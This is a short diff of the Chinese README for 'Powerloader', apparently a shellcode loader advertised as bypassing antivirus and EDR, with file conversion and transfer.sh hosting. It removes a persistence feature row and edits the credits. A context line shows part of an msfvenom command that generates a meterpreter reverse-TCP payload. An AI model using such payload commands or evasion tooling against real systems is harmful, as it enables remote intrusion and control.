@@ -39,10 +39,9 @@
 
 |       功能       |                描述                |
 | :--------------: | :--------------------------------: |
-|   1.免杀加载器   |  拥有十种以上的shellcode加载方式   |
+|   1.免杀加载器   | 各种方式加载shellcode，绕过AV/EDR  |
 |  2.文件格式转换  |    Windows中文件格式之间的转换     |
-|    3.权限维持    |    动态生成Dll，入口点是DllMain    |
-| 4.自动化文件托管 | 将文件托管到：https://transfer.sh/ |
+| 3.自动化文件托管 | 将文件托管到：https://transfer.sh/ |
 
 
 
@@ -96,6 +95,4 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 # 6.致谢
 
-在编写Powerloader时学习了很多前辈的项目，在此我非常感谢他们
-
-关于C/C++的加载器 ，我参考了它的部分代码和框架格式，这非常有意义：https://github.com/icyguider/Shhhloader
+刚开始学习了他的编码方式，这非常有意义：https://github.com/icyguider/Shhhloader
